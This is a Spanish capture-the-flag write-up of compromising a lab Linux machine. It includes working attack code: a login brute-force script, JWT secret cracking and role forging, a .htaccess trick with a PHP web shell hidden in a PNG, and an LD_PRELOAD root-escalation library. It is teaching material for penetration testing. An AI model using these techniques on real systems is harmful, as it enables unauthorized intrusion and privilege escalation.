------------

Comenzamos con un escaneo en red para identificar la máquina víctima, eso mediante [[Arp-Scan]]:

```bash
arp-scan -I ens33 --localnet --ignoredups
```

![[Pasted image 20260131215626.png]]

Observamos como la IP de la máquina víctima es `192.168.1.72`.
Procedemos tratar de intuir el sistema, esto con ayuda del comando `ping`:

```bash
ping -c 1 192.168.1.72
```

![[Pasted image 20260131215828.png]]

Podemos ver que  `ttl=64`, por lo tanto intuimos una posible máquina Linux.

Comenzamos a realizar un escaneo con ayuda de [[Nmap]], esto con el primer objetivo de identificar primero los puertos abiertos:

```bash
nmap -p- --open -sS --min-rate 5000 -n -v -Pn 192.168.1.72 -oG allPorts
```

![[Pasted image 20260131220144.png]]

Se detectan los puertos `22` y `80` abiertos. Ahora vamos a realizar un segundo escaneo más centrado en obtener información de ambos puertos:

```bash
nmap -p22,80 -sVC 192.168.1.72 -oN target
```

![[Pasted image 20260131220411.png]]

Vemos que el puerto `22` corre el servicio de SSH y el puerto `80` corre HTTPD (Apache). También observamos cómo la probabilidad de ser Linux aumenta y aunque no se seguro nos sugiere un Debian, esto debido a lo que nos logra reportar [[Nmap]].

Lo primero será observar el contenido de la web:

![[Pasted image 20260131221002.png]]

Observamos una web en chino pero ninguno de los botones o enlaces llevan a ningún lado. Algo que podemos hacer es identificar qué nos reportan como tecnologías implementadas en la web algunas herramientas que, en mi caso, son Wappalyzer y Whatweb.

![[Pasted image 20260131221235.png]]
![[Pasted image 20260131221305.png]]

Los resultados nos confirman cada vez más de que se trata de un sistema Linux, en especifico, Debian.

Continuando con la web, vamos a revisar, antes de realizar un escaneo de directorios con [[Gobuster]], el código fuente para ver si logramos obtener información:

![[Pasted image 20260131221629.png]]

Al parecer tenemos una ruta. Tal cual no es valida, pero la estructura de la misma, en especial por el `=` al final, puede significar que se encuentra en Base64. Veamos qué pasa si intentamos pasarlo a texto claro:

```bash
echo 'NzQyMjE=' | base64 -d;echo
```

![[Pasted image 20260131221924.png]]

Tenemos algunos números que pueden ser la verdadera ruta. Veamos qué es lo que obtenemos:

![[Pasted image 20260131222135.png]]

Encontramos un login. Ahora podemos intentar identificar nuevamente las tecnologías de la web con ayuda de Wappalyzer y Whatweb:

![[Pasted image 20260131222244.png]]

![[Pasted image 20260131222315.png]]

Por el momento no vemos nada nuevo, pero podría estar en uso de igual forma php, cuestión que seria de comprobar mediante extensiones como `index.php`.

Comencemos a realizar un poco de reconocimiento de la web. Veamos que directorios disponibles tiene, esto con ayuda de [[Gobuster]]:

```bash
gobuster dir -u http://192.168.1.72/74221/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

![[Pasted image 20260201162914.png]]

Se encontró el directorio `uploads/`. Veamos que es lo que este contiene:

![[Pasted image 20260201163143.png]]

Observamos un directorio con el nombre `999`. Vemos lo que contiene dentro:

![[Pasted image 20260201163410.png]]

No contiene nada. Esto puede que no se vea como algo útil, pero si lo pensamos de manera más detenida, este directorio puede estar almacenando archivos subidos por algún usuario.

Ya no tenemos nada más por lo que podemos intentar un pequeño ataque de fuerza bruta al login, solo con credenciales y contraseñas comunes para verificar si obtenemos algo.

Me gusta mucho automatizar este tipo de ataques, así que primero con ayuda de Burp Suite, vamos a capturar la petición:

![[Pasted image 20260201165629.png]]

Lo que necesitamos es todo lo seleccionado en la máquina que son: método (Post), cabeceras (Headers, User-Agent, Content-Type), data y, en este caso, como la respuesta, aun siendo incorrecta, nos responde con un código de estado `200`, vamos a fijarnos cuando la longitud del contenido cambie.

Ya con toda la información necesaria, nuestro script quedará de la siguiente manera:

```python
#!/usr/bin/python3

import requests, sys, signal

def def_handler(sig, frame):
    print("\n\n[!] Saliendo....\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


def bruteForce(user, passwd):
    url_main = "http://192.168.1.72/74221/"
    header = {
        "Host":"192.168.1.72",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = f"username={user}&password={passwd}"

    r = requests.post(url=url_main, headers=header, data=data)

    if len(r.text) != 2257:
        print("\n==========Credenciales==========")
        print(f"Username:{user}")
        print(f"Password:{passwd}\n")


def readFile(file):

    dic = []

    with open(file, "r") as file:
        for line in file:
            dic.append(line.strip())

    return dic


def main():

    dic_user = readFile(sys.argv[1])
    dic_passwd = readFile(sys.argv[2])

    for user in dic_user:
        for passwd in dic_passwd:
            bruteForce(user, passwd)


if __name__ == '__main__':
    main()

```

Su ejecución es bastante sencilla y en mi caso será:

```bash
python3 bruteForce.py /usr/share/seclists/Usernames/top-usernames-shortlist.txt /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt
```

![[Pasted image 20260201173239.png]]

Observamos de forma correcta las credenciales válidas.

Una vez que ingresamos, nos encontramos con la siguiente interfaz:

![[Pasted image 20260201173720.png]]

Se nos indica algunas cosas importantes, como: usuario 123, rol `usuario` y que no tenemos permisos para subir archivos. Esto de subir archivos, de cierta forma, confirma que en la ruta `uploads/999` se almacene archivos.

En este caso inspeccionando la web encontramos algo en las cookies:

![[Pasted image 20260201185715.png]]

Observamos que tenemos un JSON Web Token. Intentemos ver el contenido del mismo primero:

![[Pasted image 20260201185846.png]]

Al parecer, el JSON Web Token es el encargado de mantener o definir el rol asociado a la cuenta. Se intentó modificar el tipo de algoritmo que usa el JWT para que sea nulo y no funcionó, esto tomando en cuenta que al pasar el algoritmo a `none` y eliminar la firma se vuelve un token invalido. Tomando en cuenta esto, vamos a intentar, mediante fuerza bruta, obtener el secreto que nos permita modificar el JWT de forma valida.

Para el ataque de fuerza bruta, primero vamos a almacenar este JWT dentro de un archivo llamado `jwt.txt` y, con ayuda de John, ejecutamos fuerza bruta de la siguiente manera:

```bash
john --wordlist=/usr/share/seclists/Passwords/scraped-JWT-secrets.txt jwt.txt
```

![[Pasted image 20260201190621.png]]

Listo, con esto tenemos que el secreto del JWT es `jwtsecret123`. Vamos a modificarlo para que el rol sea `admin`:

![[Pasted image 20260201190928.png]]

Se insertó el secreto y luego se modifico de `user` a `admin` el rol. Vamos a copiar nuevamente el JWT que vemos dando clic en `Copy JWT` y lo vamos a modificar en la web. Yo tengo una extensión que lo facilita por lo tanto queda de la siguiente forma:

![[Pasted image 20260201191147.png]]

Luego de guardar, es cuestión de recargar la web y ver qué sucede:

![[Pasted image 20260201191224.png]]

Se ha activado una opción para la subida de archivos. Veamos cómo es:

![[Pasted image 20260201191312.png]]

Excelente, tenemos para subir un archivo. En este caso voy a subir un archivo `.jpg` con el objetivo de ver si nos lo permite:

![[Pasted image 20260201191418.png]]

Observamos una ruta, vamos a intentar ver si allí nos carga el archivo:

![[Pasted image 20260201191555.png]]

Vemos que sí se abre el archivo y que efectivamente es lo que subimos, pero ahora si nos fijamos en nuestra `url`, es la misma de la que ya teníamos conocimiento. Por lo tanto, vamos a inspeccionar:

![[Pasted image 20260201191746.png]]

![[Pasted image 20260201191807.png]]

Se puede ver cómo se creó la carpeta `123` que almacena los archivos que subimos. En este punto, lo que se busca es un [[Abuso de subida de archivos]] con el objetivo de obtener un RCE.

Se realizaron diferentes pruebas y, si no es extensión tipo `.jgp` o `.png` no nos permite subirlo. Por lo tanto, vamos a intentar subir un archivo `.htaccess` el cual es interpretado por el servicio de Apache y nos permite modificar ciertas reglas dentro del servidor. En este caso nuestro objetivo será que a los archivos .png se interpreten como `php`  y se definirá el uso del intérprete `php` de la siguiente manera:

Comenzamos creando el archivo `.htaccess` y luego implementamos el siguiente contenido:

```
<IfModule mime_module>
	AddHandler php5-script .png 
	SetHandler application/x-httpd-php 
</IfModule>
```

Listo, subimos el archivo:

![[Pasted image 20260201192822.png]]

Ya con esto listo, lo que se va a hacer es subir un archivo con extensión `.png` pero su contenido será `php`, con el cual vamos a ejecutar comandos de la siguiente manera:

```php
<?php
  system($_GET['cmd']);
?>
```

![[Pasted image 20260201193218.png]]

Procedemos a subir el archivo:

![[Pasted image 20260201193234.png]]

Nos dirigimos a la ruta donde se almacenó y veremos nada por el momento:

![[Pasted image 20260201193328.png]]

Esto es debido a que se le tiene que proporcionar el comando mediante el parámetro `cmd`, como veremos en la imagen:

![[Pasted image 20260201193424.png]]

Listo, ya tenemos un RCE. Ahora vamos a realizar una Reverse Shell:

Netcat en espera:
![[Pasted image 20260201193626.png]]

Ejecutando la reverse Shell:
![[Pasted image 20260201193634.png]]

Conexión establecida:
![[Pasted image 20260201193705.png]]

Ya con la shell, comenzamos a enumerar el sistema.

Se han realizado diferentes métodos de enumeración pero no se encontró algo usual como permisos SUID o configuraciones en `sudo -l`. Algo que se puede hacer en estos casos es buscar a ver si se logra obtener archivos ocultos de la siguiente manera:

```bash
find / -name .\* 2>/dev/null
```

![[Pasted image 20260202160924.png]]

Vemos una gran cantidad de archivos dentro de `sys`, pero en realidad no encontramos nada muy relevante. Vamos a eliminar de las respuestas el resultado de `sys`, esto para evitar ver muchos archivos de una carpeta que ya se revisó:

```bash
find / -name .\* 2>/dev/null | grep -v sys
```

![[Pasted image 20260202161227.png]]

Como se observa en la imagen, se tiene dos archivos en espacial, los cuales veremos su contenido:

![[Pasted image 20260202161716.png]]

Tenemos una nota que nos relata una historia, pero encontramos un archivo `...` una cadena de texto muy similar a la que encontramos para el usuario `pentester` en el `/etc/passwd`:

![[Pasted image 20260202161938.png]]

Esto está más relacionado con el encoding. Lo que vamos a hacer es compara cada una de las letras y, donde coincidan, lo marcamos con un 0 y donde no, lo marcaremos con un 1. Esto es un proceso largo, el cual es mucho más sencillo automatizarlo con ayuda de Python:

```python
#!/usr/bin/python3

def main():
    str1 = "Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness$itwastheepochofbelief,itwastheepochofincredulity,&itwastheseasonofLight..."
    str2 = "Iuwbtthfbetuoftimfs\"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../"

    data = ""

    for let1,let2 in zip(str1,str2):
        if let1 == let2:
            data+="0"
        else:
            data+="1"

    print(data)


if __name__ == '__main__':
    main()
```

Al ejecutarlo vemos lo siguiente:

![[Pasted image 20260202162806.png]]

Ahora esto lo llevamos a algún convertidor de binario a string y obtenemos lo siguiente:

![[Pasted image 20260202162916.png]]

Esto puede ser una contraseña, y específicamente del usuario `pentester`, ya que la segunda cadena está relacionada al mismo. Por lo tanto intentémoslo:

![[Pasted image 20260202163149.png]]

Ya nos encontramos como el usuario `pentester`.

Nuevamente se realizo una enumeración para identificar alguna forma de escalar privilegios, donde se encontró que el comando `find` puede ser ejecutado como sudo. Esto, aunque lo intentemos no va a funcionar debido a que al parecer contamos con ciertas restricciones, especialmente al intentar ejecutar código de forma arbitraria.

Listando los puerto de la máquina víctima, logramos ver un puerto interno abierto, en especifico el puerto `8989`:

![[Pasted image 20260202165500.png]]

Mediante `nc`, desde la misma máquina víctima, vamos a conectarnos para ver cómo responde:

```bash
nc 127.0.0.1 8989
```

![[Pasted image 20260202171244.png]]

Nos pide una contraseña y, si no es correcta no nos deja pasar. Vamos a intentar reutilizar contraseñas como la que ya obtuvimos para el usuario `pentester` y veamos que sucede:

![[Pasted image 20260202171355.png]]

Listo, logramos obtener acceso a una shell, que al parecer es del usuario `xiix`. Por lo que en este caso voy a generar una nueva reverse shell para trabajar con una bash de mejor manera:

![[Pasted image 20260202171551.png]]

Se le dará un tratamiento a la bash, para que esto sea mucho más manejable y comenzaremos nuevamente enumerando para ver si logramos obtener algo nuevo.

Se intentó el comando `sudo -l`, pero se necesita contraseña, además de que no encontramos permisos extraños, pero sí un archivo llamado `guess_game`:

![[Pasted image 20260202171936.png]]

Si ejecutamos el archivo observamos lo siguiente:

![[Pasted image 20260202172017.png]]

Por lo poco que entiendo, es un juego en el cual se requiere adivinar el número generado entre el 0 y el 99.

Algo que se puede hacer, viendo que en general se lo ejecuta de forma múltiple y no pasa nada, es enviar múltiples veces un mismo número y esperar que en alguna ocasión se genere ese valor. Esto lo hacemos de la siguiente manera:

```bash
while true;do echo '90' | ./guess_game ;done
```

![[Pasted image 20260202172707.png]]

Luego de algún tiempo, logramos obtener un resultado correcto, donde vemos `Pass: superxiix`.

Algo que quedó pendiente es el comando `sudo -l`, que pedía de una contraseña. Vemos que obtenemos ahora:

![[Pasted image 20260202173612.png]]

Vemos que tenemos permisos para ejecutar como sudo el comando `whoami`, pero esto no es algo que en realidad nos impacte. Lo que en verdad tenemos que poner atención es en `env_keep+=LD_PRELOAD`,  ya que esta implementación nos da puerta abierta a una posible escalada de privilegios. Esto se deber a que si y solo si esta regla esta establecida por sudo y además el binario al que podemos ejecutar como sudo, en este caso `whoami`, es dinámico, se puede abusar de las librerías compartidas para crear una maliciosa que nos ejecute una shell antes de siquiera llegar a ejecutar el binario.

Uno de los requisitos se cumple. Verifiquemos si `whoami` es dinámico de la siguiente manera:

```bash
ldd /bin/whoami
```

![[Pasted image 20260202174304.png]]

Vemos que lista algunas librerías por lo tanto es dinámico.

Con los dos puntos esenciales confirmados, podemos comenzar a crear una librería maliciosa en C para utilizarla de la siguiente manera:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
```

El nombre puede ser el que queramos. Ya tenemos listo nuestro archivo `hack.c` y lo compilaremos de la siguiente forma:

```bash
gcc -fPIC -shared -nostartfiles -o hack.so hack.c
```

![[Pasted image 20260202175611.png]]

Donde:
- `-fPIC` -> Permite generar una librería independiente capaz de ser cargada en una dirección diferente de memoria.
- `-shared` -> Definimos que será una librería compartida en lugar de una ejecutable.
- `-nostartfiles` -> Indicamos que la librería no requiere de los archivos runtime, debido a que la librería no requiere de un punto de entrada ni de un flujo de ejecución autónomo.

Ya con esto solo queda ejecutar `/bin/whoami` llamando a esta librería de la siguiente manera:

```bash
sudo LD_PRELOAD=./hack.so /bin/whoami
```

![[Pasted image 20260202182231.png]]

Ya nos encontramos como usuario `root` y es cuestión de enviar la flag.

![[Pasted image 20260202182449.png]]

Máquina Terminada.